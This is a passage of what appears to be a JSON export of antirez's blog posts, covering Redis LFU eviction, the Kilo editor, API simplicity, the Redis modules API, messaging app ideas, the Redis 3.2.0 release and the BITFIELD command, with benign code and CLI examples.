implementations, at least to check obvious speed regressions.  Least Frequently Used ===  The reason I\u2019m writing this blog post right now is because a couple of days ago I worked at a partial reimplementation and to different improvements to the Redis cache eviction code.  Everything started from an open issue: when you have multiple databases with Redis 3.2, the algorithm evicts making local choices. So if for example you have all keys with a small idle time in DB number 0, and all keys with large idle time in DB number 1, Redis will evict one key from each DB. A more rational choice is of course to start evicting keys from DB number 1, and only later to evict the other keys.  This is usually not a big deal, when Redis is used as a cache it is rarely used with different DBs, however this is how I started to work at the eviction code again. Eventually I was able to modify the pool to include the database ID, and to use a single pool for all the DBs instead of using multiple pools. It was slower, but by profiling and tuning the code, eventually it was faster than the original implementation by around 20%.  However my curiosity for this subsystem of Redis was stimulated again at that point, and I wanted to improve it. I spent a couple of days trying to improve the LRU implementation: use a bigger pool maybe? Account for the time that passes when selecting the best key?  After some time, and after refining my tools, I understood that the LRU algorithm was limited by the amount of data sampled in the database and was otherwise very good and hard to improve. This is, actually, kinda evident from the image showing the different algorithms: sampling 10 keys per cycle the algorithm was almost as accurate as theoretical LRU.  Since the original algorithm was hard to improve, I started to test new algorithms. If we rewind a bit to the start of the blog post, we said that LRU is actually kinda a trick. What we really want is to retain keys that have the maximum probability of being accessed in the future, that are the keys *most frequently accessed*, not the ones with the latest access.  The algorithm evicting the keys with the least number of accesses is called LFU. It means Least Frequently Used, which is the feature of the keys that it attempts to kill to make space for new keys.  In theory LFU is as simple as associating a counter to each key. At every access the counter gets incremented, so that we know that a given key is accessed more frequently than another key.  Well, there are at least a few more problems, not specific to Redis, general issues of LFU implementations:  1. With LFU you cannot use the \u201cmove to head\u201d linked list trick used for LRU in order to take elements sorted for eviction in a simple way, since keys must be ordered by number of accesses in \u201cperfect LFU\u201d. Moving the accessed key to the right place can be problematic because there could be many keys with the same score, so the operation can be O(N) in the worst case, even if the key frequency counter changed just a little. Also as we\u2019ll see in point \u201c2\u201d the accesses counter does not always change just a little, there are also sudden large changes.  2. LFU can\u2019t really be as trivial as, just increment the access counter on each access. As we said, access patterns change over time, so a key with an high score needs to see its score reduced over time if nobody keeps accessing it. Our algorithm must be albe to adapt over time.  In Redis the first problems is not a problem: we can just use the trick used for LRU: random sampling with the pool of candidates. The second problem remains. So normally LFU implementations have some way in order to decrement, or halve the access counter from time to time.  Implementing LFU in 24 bits of space ===  LFU has its implementation peculiarities itself, however in Redis all we can use is our 24 bit LRU field in order to model LFU. To implement LFU in just 24 bits per objects is a bit more tricky.  What we need to do in 24 bits is:  1. Some kind of access frequency counter. 2. Enough information to decide when to halve the counter.  My solution was to split the 24 bits into two fields:             16 bits      8 bits       +----------------+--------+       + Last decr time | LOG_C  |       +----------------+--------+  The 16 bit field is the last decrement time, so that Redis knows the last time the counter was decremented, while the 8 bit field is the actual access counter.  You are thinking that it\u2019s pretty fast to overflow an 8 bit counter, right? Well, the trick is, instead of using just a counter, I used a logarithmic counter. This is the function that increments the counter during accesses to the keys:    uint8_t LFULogIncr(uint8_t counter) {       if (counter == 255) return 255;       double r = (double)rand()/RAND_MAX;       double baseval = counter - LFU_INIT_VAL;       if (baseval < 0) baseval = 0;       double p = 1.0/(baseval*server.lfu_log_factor+1);       if (r < p) counter++;       return counter;   }  Basically the greater is the value of the counter, the less probable is that the counter will really be incremented: the code above computes a number \u2018p\u2019 between 0 and 1 which is smaller and smaller as the counter increases. Then it extracts a random number \u2018r\u2019 between 0 and 1 and only increments the counter if \u2018r < p\u2019 is true.  You can configure how much aggressively the counter is implemented via redis.conf parameters, but for instance, with the default settings, this is what happens:  After 100 hits the value of the counter is 10 After 1000 is 18 After 100k is 142 After 1 million hits it reaches the 255 limit and no longer increments  Now let\u2019s see how this counter is decremented. The 16 bits are used in order to store the less significant bits of the UNIX time converted to minutes. As Redis performs random sampling scanning the key space in search of keys to populate the pool, all keys that are encountered are checked for decrement. If the last decrement was performed more than N minutes ago (with N configurable), the value of the counter is halved if it is an high value, or just decremented if it is a lower value (in the hope that we can better discriminate among keys with few accesses, given that our counter resolution is very small).  There is yet another problem, new keys need a chance to survive after all. In vanilla LFU a just added key has an access score of 0, so it is a very good candidate for eviction. In Redis new keys start with an LFU value of 5. This initial value is accounted in the increment and halving algorithms. Simulations show that with this change keys have some time in order to accumulate accesses: keys with a score less than 5 will be preferred (non active keys for a long time).  Code and performances ===  The implementation described above can be found in the \u201cunstable\u201d branch of Redis. My initial tests show that it outperforms LRU in power-law access patterns, while using the same amount of memory per key, however real world access patterns may be different: time and space locality of accesses may change in very different ways, so I\u2019ll be very happy to learn from real world use cases how LFU is performing, and how the two parameters that you can tune in the Redis LFU implementation change the performances for different workloads.  Also an OBJECT FREQ subcommand was added in order to report the frequency counter for a given key, this can be both useful in order to observe an application access pattern, and in order to debug the LFU implementation.  Note that switching at runtime between LRU and LFU policies will have the effect to start with almost random eviction, since the metadata accumulated in the 24 bits counter does not match the meaning of the newly selected policy. However over time it adapts again.  There are probably many improvements possible.  Ben Manes pointed me to this interesting paper, describing an algorithm called TinyLRU (http://arxiv.org/pdf/1512.00727.pdf).  The paper contains a very neat idea: instead of remembering the access frequency of the current objects, let\u2019s (probabilistically) remember the access frequency of all the objects seen so far, this way we can even refuse new keys if, from the name, we believe they are likely to get little accesses, so that no eviction is needed at all, if evicting a key means to lower the hits/misses ratio.  My feeling is that this technique, while very interesting for plain GET/SET LFU caches, is not applicable to the data structure server nature of Redis: users expect the key to exist after being created at least for a few milliseconds. Refusing the key creation at all seems semantically wrong for Redis.  However Redis maintains LFU informations when a key is overwritten, so for example after a:      SET oldkey some_new_value  The 24 bit LFU counter is copied to the new object associated to the old key.  The new eviction code of Redis unstable contains other good news:  1. Policies are now \u201ccross DB\u201d. In the past Redis made local choices as explained at the start of this blog post. Now this is fixed for all the policies, not just LRU.  2. The volatile-ttl eviction policy, which is the one that evicts based on the remaining time to live of keys with an expire set, now uses the pool like the other policies.  3. Performances are better by reusing SDS objects in the pool of keys.  This post ended a lot longer than I expected it to be, but I hope it offered a few insights on the new stuff and the improvements to the old things we already had. Redis, more than a \u201csolution\u201d to solve a specific problem, is a generic tool. It\u2019s up to the sensible developer to apply it in the right way. Many people use Redis as a caching solution, so improvements in this area are always investigated from time to time.  Hacker News comments: https://news.ycombinator.com/item?id=12185534 Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2016-07-29T08:04:12Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7461.4443411, "slug": "random-notes-on-improving-the-redis-lru-algorithm-31", "topics": []}}, {"model": "app.post", "pk": 32, "fields": {"title": "Writing an editor in less than 1000 lines of code, just for fun", "link": "http://antirez.com/news/108", "source": 1, "normalized_link": "antirez.com/news/108", "summary": "WARNING: Long pretty useless blog post. TLDR is that I wrote, just for fun, a text editor in less than 1000 lines of code that does not depend on ncurses and has support for syntax highlight and search feature. The code is here: http://github.com/antirez/kilo.  Screencast here: https://asciinema.org/a/90r2i9bq8po03nazhqtsifksb  For the sentimentalists, keep reading\u2026  A couple weeks ago there was this news about the Nano editor no longer being part of the GNU project. My first reaction was, wow people still really care about an old editor which is a clone of an editor originally part of a terminal based EMAIL CLIENT. Let\u2019s say this again, \u201cemail client\u201d. The notion of email client itself is gone at this point, everything changed. And yet I read, on Hacker News, a number of people writing how they were often saved by the availability of nano on random systems, doing system administrator tasks, for example. Nano is also how my son wrote his first program in C. It\u2019s an acceptable experience that does not require past experience editing files.  This is how I started to think about writing a text editor ways smaller than Nano itself. Just for fun, basically, because I like and admire small programs.  How lame, useless, wasting of time is today writing an editor? We are supposed to write shiny incredible projects, very cool, very complex, valuable stuff. But sometimes to make things without a clear purpose is refreshing. There were also memories\u2026  I remember my first experiences with the Commodore 16 in-ROM assembler, and all the home computers and BASIC interpreters I used later in my child life. An editor is a fundamental connection between the human and the machine. It allows the human to write something that the computer can interpret. The blinking of a square prompt is something that many of us will never forget.  Well, all nice, but my time was very limited. A few hours across two weekends with programmed family activities and meat to prepare for friends in long barbecue sessions. Maybe I could still write an editor on a few spare hours with some trick. My goal was to write an editor which was very small, no curses, and with syntax highlighting. Something usable, basically. That\u2019s the deal.. It\u2019s little stuff, but is already hard to write all this from scratch in a few hours.  But \u2026 wait, I actually wrote an editor in the past, is part of the LOAD81 project, a Lua based programming environment for children. Maybe I can just reuse it\u2026 and instead of using SDL to write on the screen what about sending VT100 escape sequences directly to the terminal? And I\u2019ve code for this as well in linenoise, another toy project that eventually found its place in some may other serious projects. So maybe mixing the two\u2026  The first week Saturday morning I went to the sea, and it was great. Later my brother arrived from Edinburg to Catania, and at the end of the day we were together in the garden with our laptops, trying to defend ourselves from the 30 degrees that there were during the day, so I started to hack the first skeleton of the editor. The LOAD81 code was quite modular, to take it away from the original project was a joke. I could kinda edit after a few hours, and it was already time to go bed. The next day I worked again at it before leaving for the sea again. My 15yo sleeps till 1pm, as I did when I was 15yo in summertime after all, so I coded more in sprints of 30 minutes waiting for him to get up, using the rest of the time to play with my wonderful daughter. Finally later in the Sunday night I tried to fix all the remaining stuff.  Hey I remember that a few years ago to hack on a project was, to *hack* on it, full time for days. I\u2019m old now, but still young enough to write toy editors and consider it a serious business :-)  However life is hard, and Monday arrived. Real business, no time for toy projects, not even time to release what I got during the weekend\u2026 It deserved some minimal polishing and a blog post.  I had to wait this Monday to put my hands on the \u201cKilo\u201d editor again. It\u2019s called Kilo because it has less than 1024 lines of code. The \u201ccloc\u201d utility, used in order to count the number of lines of code, signaled me I still had ~100 lines of space before reaching 1024 LOC, and a serious editor needs a \u201csearch\u201d feature after all. So back to the code, trying also to restructure and recomment it a bit, since you know, when you mix two projects pieces in a few hours the risk is that the code quality is less than excellent.  Well, now it\u2019s time to release it, end of this crazy project. Maybe somebody will use it as a starting point to write a real editor, or maybe it could be used to write some new interesting CLI that goes over the usual REPL style model.  The code is at http://github.com/antirez/kilo  HN comments: https://news.ycombinator.com/item?id=12065217 Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2016-07-10T10:51:11Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7425.1869856, "slug": "writing-an-editor-in-less-than-1000-lines-of-code-just-for-fun-32", "topics": []}}, {"model": "app.post", "pk": 33, "fields": {"title": "Programmers are not different, they need simple UIs.", "link": "http://antirez.com/news/107", "source": 1, "normalized_link": "antirez.com/news/107", "summary": "I\u2019m spending days trying to get a couple of APIs right. New APIs about modules, and a new Redis data type. I really mean it when I say *days*, just for the API. Writing drafts, starting the implementation shaping data structures and calls, and then restarting from scratch to iterate again in a better way, to improve the design and the user facing part.  Why I do that, delaying features for weeks? Is it really so important? Programmers are engineers, maybe they should just adapt to whatever API is better to export for the system exporting it.  Should I really reply to my rhetorical questions? No, it is no longer needed today, and that\u2019s a big win.  I want to assume that at this point is tacit, given for granted, that programmers also have user interfaces, and that such user interfaces are so crucial to completely change the perception of a system. Database query languages, libraries calls, programming languages, Unix command line tools, they all have an User Interface part. If you use them daily, for you they are more UIs than anything else.  So if this is all well known why I\u2019m here writing this blog post? Because I want to stress how important is the concept of simplicity, not just in graphical UIs, but also in UIs designed for programmers. The act of iterating again and again to find a simple UI solution is not a form of perfectionism, it\u2019s not futile narcissism. It is more an exploration in the design space, that sometimes is huge, made of small variations that make a big difference, and made of big variations that completely change the point of view. There are no rules to follow but your sensibility. Yes there are good practices, but they are not a good compass when the sea to navigate is the one of the design *space*.  So why programmers should have this privilege of having good, simple UIs? Sure there is the joy of using something well made, that is great to handle, that feels *right*. But there is a more central question. Learning to configure Sendmail via M4 macros, or struggling with an Apache virtual host setup is not real knowledge. If such a system one day is no longer in use, what remains in your hands, or better, in your neurons? Nothing. This is ad-hoc knowledge. It is like junk food: empty calories without micronutrients.  For programmers, the micronutrients are the ideas that last for decades, not the ad-hoc junk. I don\u2019t want to ship junk, so I\u2019ll continue to refine my designs before shipping. You should not accept junk, your neurons are better spent to learn general concepts. However in part it is inevitable: every system will have something that is not general that we need to learn in order to use it. Well, if that\u2019s the deal, at least, let\u2019s make the ad-hoc part a simple one, and if possible, something that is even fun to use. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2016-05-24T15:06:17Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7335.2871189, "slug": "programmers-are-not-different-they-need-simple-uis-33", "topics": []}}, {"model": "app.post", "pk": 34, "fields": {"title": "Redis Loadable Modules System", "link": "http://antirez.com/news/106", "source": 1, "normalized_link": "antirez.com/news/106", "summary": "It was a matter of time but it eventually happened. In the Redis 1.0 release notes, 7 years ago, I mentioned that one of the interesting features for the future was \u201cloadable modules\u201d. I was really interested in such a feature back then, but over the years I became more and more skeptic about the idea of adding loadable modules in Redis. And probably for good reasons.  Modules can be the most interesting feature of a system and the most problematic one at the same time: API incompatibilities between versions, low quality modules crashing the system, a lack of identity of a system that is extendible are possible problems. SO, for years, I managed to avoided adding modules to Redis, and Lua scripting was a good tool in order to delay their addition. At the same time, years of experience with scripting, demonstrated that scripting is a way to \u201ccompose\u201d existing features, but not a way to extend the capabilities of a system towards use cases it was not designed to cover.  Previous attempts at modules also showed that one of the main pain points about mixing Redis and loadable modules is the way modules are bound with the Redis core. In may ways Redis resembles more a programming language than a database. To extend Redis properly, the module needs to have access to the internal API of the system. Directly exporting the Redis core functions to modules creates huge problems: the module starts to depend on the internal details of Redis. If the Redis core evolves, the module needs to be rewritten. This creates either a fragile modules ecosystem or stops the evolution of the Redis core. Redis internals can\u2019t stop to evolve, nor the modules developers can keep modifying the module in order to stay updated with the internals (something that happened in certain popular systems in the past, with poor results).  With all this lessons in mind, I was leaving Catania to fly to Tel Aviv, to have a meeting at Redis Labs to talk about the roadmap for the future months. One of the topics of our chat was loadable modules. During the flight I asked myself if it was possible to truly decouple the Redis core from the modules API, but still have a low level access to directly manipulate Redis data structure. So I started to immediately code something. What I wanted was an extreme level of API compatibility for the future, so that a module wrote today could work in 4 years from now with the same API, regardless of the changes to the Redis core. I also wanted binary compatibility so that the 4 years old module could even *load* in the new Redis versions and work as expected, without even the need to be recompiled.  At the end of the flight I arrived in Tel Aviv with something already working in the \u201cmodules\u201d branch. We discussed together how the API would work, and at the end everybody agreed that to be able to manipulate Redis internals directly was a fundamental feature. What we wanted to accomplish was to allow Redis developers to create commands that were as capable as the Redis native commands, and also as fast as the native commands. This cannot be accomplished just with an high level API that calls Redis commands, it\u2019s too slow and limited. There is no point in having a Redis modules system that can just do what Lua can already do. You need to be able to say, get me the value associated with this key, what type is it? Do this low level operation on the value. Given me a cursor into the sorted set at this position, go to the next element, and so forth. To create an API that works as an intermediate layer for such low level access is tricky, but definitely possible.  I returned home and started to work at the modules system immediately. After a couple of weeks I had a prototype that was already functional enough to develop interesting modules, featuring low level functions like data types low level access, strings DMA to poke with the internals of strings without wrappers when needed, a replication API, an interesting sorted set iterator API, and so forth. It looked was a very promising start, however the project was kinda of \u201csecret\u201d because it was not clear if it was viable initially. Also we wanted to avoid everybody to start developing modules while the API was extremely unstable and subject to changes.  The result of this process, while not complete, is very promising, so today I\u2019m announcing the new feature at Redis Conference 2016, and the code was just pushed into the \u201cunstable\u201d branch. But let\u2019s check the API a bit\u2026  Here is a trivial example of what a module can do and how it works. It implements a \u201clist splice\u201d operation that moves elements from a list to another:  int HelloListSpliceAuto_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {     if (argc != 4) return RedisModule_WrongArity(ctx);      RedisModule_AutoMemory(ctx);      RedisModuleKey *srckey = RedisModule_OpenKey(ctx,argv[1],         REDISMODULE_READ|REDISMODULE_WRITE);     RedisModuleKey *dstkey = RedisModule_OpenKey(ctx,argv[2],         REDISMODULE_READ|REDISMODULE_WRITE);      /* Src and dst key must be empty or lists. */     if ((RedisModule_KeyType(srckey) != REDISMODULE_KEYTYPE_LIST &&          RedisModule_KeyType(srckey) != REDISMODULE_KEYTYPE_EMPTY) ||         (RedisModule_KeyType(dstkey) != REDISMODULE_KEYTYPE_LIST &&          RedisModule_KeyType(dstkey) != REDISMODULE_KEYTYPE_EMPTY))     {         return RedisModule_ReplyWithError(ctx,REDISMODULE_ERRORMSG_WRONGTYPE);     }      long long count;     if ((RedisModule_StringToLongLong(argv[3],&count) != REDISMODULE_OK) ||         (count < 0))     {         return RedisModule_ReplyWithError(ctx,\"ERR invalid count\");     }      while(count-- > 0) {         RedisModuleString *ele;          ele = RedisModule_ListPop(srckey,REDISMODULE_LIST_TAIL);         if (ele == NULL) break;         RedisModule_ListPush(dstkey,REDISMODULE_LIST_HEAD,ele);     }      size_t len = RedisModule_ValueLength(srckey);     RedisModule_ReplyWithLongLong(ctx,len);     return REDISMODULE_OK; }  int RedisModule_OnLoad(RedisModuleCtx *ctx) {     if (RedisModule_Init(ctx,\"helloworld\",1,REDISMODULE_APIVER_1)         == REDISMODULE_ERR) return REDISMODULE_ERR;      if (RedisModule_CreateCommand(ctx,\"hello.list.splice.auto\",         HelloListSpliceAuto_RedisCommand,         \"write deny-oom\",1,2,1) == REDISMODULE_ERR)         return REDISMODULE_ERR; }  There was a big effort into providing a clean API, and an API that is not prone to misuses. For example there is support for automatic memory management, so that the context the command operates on, collects the objects that are not explicitly freed by the user, in order to free them when the command returns if needed. This makes writing modules a lot simpler.  You can find the API documentation here (not perfect but there is enough to get familiar): https://github.com/antirez/redis/blob/unstable/src/modules/INTRO.md  And the API reference here: https://github.com/antirez/redis/blob/unstable/src/modules/API.md  And many simple examples of commands here: https://github.com/antirez/redis/blob/unstable/src/modules/helloworld.c  The API is yet not complete nor stable, and will be released with the next stable version of Redis (likely 4.0). However it is already enough to do a lot of things, and my colleagues did very interesting things, from inverted indexes to authentication systems. In the next weeks we\u2019ll fill all the holes, for example there is no low level Set API, so you\u2019ll have to use Call() style API for now. Similarly the iterator is only provided for the sorted set type, and so forth.  But the important point is that the process is now started, and Redis is becoming an extendible system. I think this will give more power to Redis users, power to go \u201cfaster\u201d than the project itself, in using Redis to model their problems, with the big promise that, after Redis 4.0 RC is out, we\u2019ll not break the API ever for years to come, so that modules work will not get wasted. Note that we *can improve* the API, since the module registration asks for a given API version, so it will be possible to maintain the backward compatibility while at the same time release new versions of the API.  Soon there will be a Modules Directory were you can register your modules, using redis-cli, into a server that talks the Redis protocol. It was not possible to finish it in time unfortunately, but it is just a matter of weeks.  I\u2019m very very excited about what will happen now! Modules will have a Bazar model like clients, so there will not be \u201cofficial modules\u201d. The good ones will be used for sure, and all will get listed in the Redis site, probably ranked by Github stars or something like that.  I hope many users will start to be part of the modules ecosystem and make Redis able to solve very specific use cases that was not wise to solve inside the core, but that are a good fit for modules.  Now I need your feedbacks while the API is still malleable. Tell me what you think! Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2016-05-10T17:02:55Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7308.56263, "slug": "redis-loadable-modules-system-34", "topics": []}}, {"model": "app.post", "pk": 35, "fields": {"title": "Three ideas about text messages", "link": "http://antirez.com/news/105", "source": 1, "normalized_link": "antirez.com/news/105", "summary": "I\u2019m aboard of a flight bringing me to San Francisco. Eventually I purchased the slowest internet connection of my life (well at least for a good reason), but for several hours I was without internet, as usually when I fly.  I don\u2019t mind staying disconnected for some time usually. It\u2019s a good time to focus, write some code, or a blog post like this one. However when I\u2019m disconnected, what makes the most difference is not Facebook or Twitter or Github, but the lack of text messages.  At this point text messages are a fundamental thing in my life. They are also probably the main source of distraction. I use messages to talk with my family, even just to communicate between different floors. I use messages with friends to organize dinners and vacations. I even use messages with the plumber or the doctor.  Clearly messages are not going to go away. They need to get better, so I usually tend to thing at topics related to messaging applications. The following are three recurrent thoughts I\u2019ve about this topic.  1. WhatsApp is not used in the US.  Do you know what\u2019s the social network that is reshaping the most the way we communicate in Europe? Is the WhatsApp application. Since it is the total standard and an incredible amount of the population has it, \u201cWhatsApp Groups\u201d is changing the way people communicate. There is a group for each school class, one for the children and one for the parents. One for families, another for groups of friends. One for the kindergarten of my daughter, where teachers post from time to time pictures of our children doing activities.  WhatsApp is also one of the main pains of modern life. All this groups continuously beep. However what they are doing for the society is incredible: they are truly making every human being interconnected. This magic is possible because here in Italy, and in most other EU countries, WhatsApp is *the standard* so everybody assumes you use it.  To me it is pretty incredible that this is not happening in the US, the place where most social applications are funded and created. Given that in the US there are both Android and iOS phones I wonder what\u2019s stopping this from happening. My guess is that it\u2019s just a matter of time and a unified messaging platform will happen there too.  * Why voice recognition is not used more.  For people that can write text fast into a real keyboard, the software keyboard of the phone is one of the most annoying things ever. Similarly, teenagers excluded, many other people have issues writing long text messages with a phone keyboard.  At the same time, the voice recognition software of Android, powered by the Google servers, reached a point where it rarely does errors at all, so why just a few people use it on a daily basis? My theory is that the user interface to activate and use the voice recognition feature is so bad to be the main barrier to make this feature a big hit.  First you have to find how to activate it, and usually is not a prominent button on the keyboard. Then there is this delay and it emits a beep and starts to listen, and it\u2019s not clear exactly how to stop it, especially if the environment is aloud. The whole thing looks like if you are suffering from the servers latency, but voice is voice. With delays and non clear experience you kill the big advantage of talking to your phone. This should be just a \u201cpush the button while you talk\u201d thing. When you push the button, the system starts to record your voice immediately and connects asynchronously to the servers. As text arrives back, it is shown to the user. When the user releases the button the voice thing is done. As simple as that. At the end, the words that were inserted in this way could be shown in some special way (like a different gray) in the text area, so that one can tap individual words and select alternatives if there are errors.  Please Google freaking do that. I wonder if it\u2019s any better on iOS, I don\u2019t use it for some time at this point.  * Auto transcription of text messages.  Since the phone keyboard is such a mess, people are using more and more voice messages, especially with WhatsApp. It is very convenient for people writing messages, since there is the \u201cpush and talk\u201d experience that there is not in the speech to text feature. However it is not always very convenient for the people receiving the message, that may be in an environment where to listen to the conversation is not easy.  However there is something that could work in that regard, that is, the WhatsApp (or whatever) servers, should automatically translate the message to text, so that the user can both play the message or just look at the text, if it\u2019s clear enough. When there are doubts on given words, the text can be highlighted in some way to show the user that it\u2019s better to listen to the voice message since there are non clear words, however this could easily make 95% of messages promptly available to the user just reading.  This way the feature would be friction-less both ways, for the users writing (dictating actually) and for the user receiving the messages.   TLDR: Messaging is everywhere, make it better. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2016-05-07T18:42:15Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7302.9350744, "slug": "three-ideas-about-text-messages-35", "topics": []}}, {"model": "app.post", "pk": 36, "fields": {"title": "Redis 3.2.0 is out!", "link": "http://antirez.com/news/104", "source": 1, "normalized_link": "antirez.com/news/104", "summary": "It took more than expected, but finally we have it, Redis 3.2.0 stable is out with changes that may be useful to a big number of Redis users. At this point I covered the changes multiple time, but the big ones are:  * The GEO API. Index whatever you want by latitude and longitude, and query by radius, with the same speed and easy of use of the other Redis data structures. Here you can find the API documentation: http://redis.io/commands/#geo. Thank you to Matt Stancliff for the initial implementation, that was reworked but is still at the core of the GEO API, and to the developers of ARDB for providing the geo indexing code that Matt used.  * The new BITFIELD command allows to use a Redis string as a bit array composed of many integers with user specified size and offset. It supports increments and decrements to exploit this small (or large) integers as counters, with fine control over the overflow behavior. http://redis.io/commands/bitfield. Thanks to Yoav Steinberg for pushing forward this crazy idea and motivating me to write an implementation.  * Many improvements to Redis Cluster, including rebalancing capabilities in redis-trib and better replicas migration. However support for NATted envrionments and Docker port forwarding, while implemented in the \u201cunstable\u201d branch, was not backported to 3.2 for maturity concerns.  * Improvements to Lua scripts replication. It is now possible to use \u201ceffects replication\u201d to write scripts containing side effects. It\u2019s documented here:  http://redis.io/commands/EVAL.  Thanks to Yossi Gottlieb for stimulating the addition of this feature and helping in the design.  * We have now a serious Lua scripts debugger: https://www.youtube.com/watch?v=IMvRfStaoyM with support into redis-cli. Thanks to Itamar Haber, developer of non trivial scripts since the start of Lua scripting, that really wanted this feature and helped during the development.  * Redis is now more memory efficient thanks to changes operated by Oran Agra to SDS and the Jemalloc size classes setup. Also we have a new List internal representation contributed by Matt Stancliff which uses just a small percentage of the memory used before to represent large lists!  * Finally slaves and masters are in agreement about what keys are expired during read operations. It was about time :-)  * SPOP now accepts an optional count argument. Thanks to Alon Diamant for providing the initial implementation. I kinda rewrote it for performances later, and we ended with a pretty fast thing.  * RDB AUX fields. So now your RDB files have a few informations inside, like the server that generated it, in what date, and so forth. Soon we\u2019ll have redis-cli able to parse those fields (in 3.2.1) hopefully. It\u2019s a small amount of work but I\u2019m remembering only know writing this notes, honestly.  * RDB loading is faster now.  * Sentinel can now scale monitoring many masters, but should be considered more an advanced beta than stable, so please test it in your environment carefully before deploying, a lot of code changed inside Sentinel internals.  * Many more things but this list is already long enough.  A big thank you to all the contributors that made this release possible, to the Redis user base which is lovely and encouraging, and to Redis Labs for sponsoring a lot of the work that went into 3.2.0.  During the previous weeks we also worked to a new interesting feature that will be released in the next versions of Redis, it will be announced during RedisConf 2016 in San Francisco, 10-11 May, so stay tuned!  One note about stability. I keep saying it all the time, but stability in software is not black and white. It\u2019s like pink, yellow and green. No just kidding. It\u2019s the usual shades of gray. So 3.2.0 looks solid, however it\u2019s fresh meat. Start to use it incrementally and check how it works for you, and please report any issue promptly. However it\u2019s also true that given that it stayed in RC for a lot of time, it was already tested by the brave users that were too much in need for the new features to deploy it ASAP.  The 3.2.0 full changelog is here: https://raw.githubusercontent.com/antirez/redis/3.2/00-RELEASENOTES  Redis 3.2.0 can be obtained as a tarball at http://download.redis.io, or by fetching the 3.2.0 tag from Github antirez/redis repository.  Enjoy! Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2016-05-06T11:07:50Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 7300.4091856, "slug": "redis-320-is-out-36", "topics": []}}, {"model": "app.post", "pk": 37, "fields": {"title": "100 more of those BITFIELDs", "link": "http://antirez.com/news/103", "source": 1, "normalized_link": "antirez.com/news/103", "summary": "Today Redis is 7 years old, so to commemorate the event a bit I passed the latest couple of days doing a fun coding marathon to implement a new crazy command called BITFIELD.  The essence of this command is not new, it was proposed in the past by me and others, but never in a serious way, the idea always looked a bit strange. We already have bit operations in Redis: certain users love it, it\u2019s a good way to represent a lot of data in a compact way. However so far we handle each bit separately, setting, testing, getting bits, counting all the bits that are set in a range, and so forth.  What about implementing bitfields? Short or large, arbitrary sized integers, at arbitrary offsets, so that I can use a Redis string as an array of 5 bits signed integers, without losing a single bit of juice.  A few days ago, Yoav Steinberg from Redis Labs, proposed a set of commands on arbitrary sized integers stored at bit offsets in a more serious way. I smiled when I read the email, since this was kinda of a secret dream. Starting from Yoav proposal and with other feedbacks from Redis Labs engineers, I wrote an initial specification of a single command with sub-commands, using short names for types definitions, and adding very fine grained control on the overflow semantics.  I finished the first implementation a few minutes ago, since the plan was to release it for today, in the hope Redis appreciates we do actual work in its bday.  The resulting BITFIELD command supports different subcommands:  SET    \u2014 Set the specified value and return its previous value. GET   \u2014 Get the specified value. INCRBY    \u2014 Increment the specified counter.  There is an additional meta command called OVERFLOW, used to set (guess what) the overflow semantics of the commands that will follow (so OVERFLOW can be specified multiple times):  OVERFLOW SAT \u2014 Saturation, so that overflowing in one direction or the other, will saturate the integer to its maximum value in the direction of the overflow. OVERFLOW WRAP \u2014 This is usual wrap around, but the interesting thing is that this also works for signed integers, by wrapping towards the most negative or most positive values. OVERFLOW FAIL \u2014 In this mode the operation is not performed at all if the value would overflow.  The integer types can be specified using the \u201cu\u201d or \u201ci\u201d prefix followed by the number of bits, so for example u8, i5, u20 and i53 are valid types. There is a limitation: u64 cannot be specified since the Redis protocol is unable to return 64 bit unsigned integers currently.  It's time for a few examples: in order to increment an unsigned integer of 8 bits I could use:  127.0.0.1:6379> BITFIELD mykey incrby u8 100 1 1) (integer) 3  This is incrementing an unsigned integer, 8 bits, at offset 100 (101th bit in the bitmap).  However there is a different way to specify offsets, that is by prefixing the offset with \u201c#\u201d, in order to say: \"handle the string as an array of counters of the specified size, and set the N-th counter\". Basically this just means that if I use #10 with an 8 bits type, the offset is obtained by multiplying 8*10, this way I can address multiple counters independently without doing offsets math:  127.0.0.1:6379> BITFIELD mykey incrby u8 #0 1 1) (integer) 1 127.0.0.1:6379> BITFIELD mykey incrby u8 #0 1 1) (integer) 2 127.0.0.1:6379> BITFIELD mykey incrby u8 #1 1 1) (integer) 1 127.0.0.1:6379> BITFIELD mykey incrby u8 #1 1 1) (integer) 2  The ability to control the overflow is also interesting. For example an unsigned counter of 1 bit will actually toggle between 0 and 1 with the default overflow policy of \u201cwrap\u201d:  127.0.0.1:6379> BITFIELD mykey incrby u1 100 1 1) (integer) 1 127.0.0.1:6379> BITFIELD mykey incrby u1 100 1 1) (integer) 0 127.0.0.1:6379> BITFIELD mykey incrby u1 100 1 1) (integer) 1 127.0.0.1:6379> BITFIELD mykey incrby u1 100 1 1) (integer) 0  As you can see it alternates 0 and 1.  Saturation can also be useful:  127.0.0.1:6379> bitfield mykey overflow sat incrby i4 100 -3 1) (integer) -3 127.0.0.1:6379> bitfield mykey overflow sat incrby i4 100 -3 1) (integer) -6 127.0.0.1:6379> bitfield mykey overflow sat incrby i4 100 -3 1) (integer) -8 127.0.0.1:6379> bitfield mykey overflow sat incrby i4 100 -3 1) (integer) -8  As you can see, decrementing 3 never goes under -8.  Note that you can carry multiple operations in a single command. It always returns an array of results:  127.0.0.1:6379> BITFIELD mykey get i4 100 set u8 200 123 incrby u8 300 1 1) (integer) -8 2) (integer) 123 3) (integer) 7  The intended usage for this command is real time analytics, A/B testing, showing slightly different things to users every time by using the overflowing of integers. Packing so many small counters in a shared and memory efficient way can be exploited in many ways, but that\u2019s left as an exercise for the talented programmers 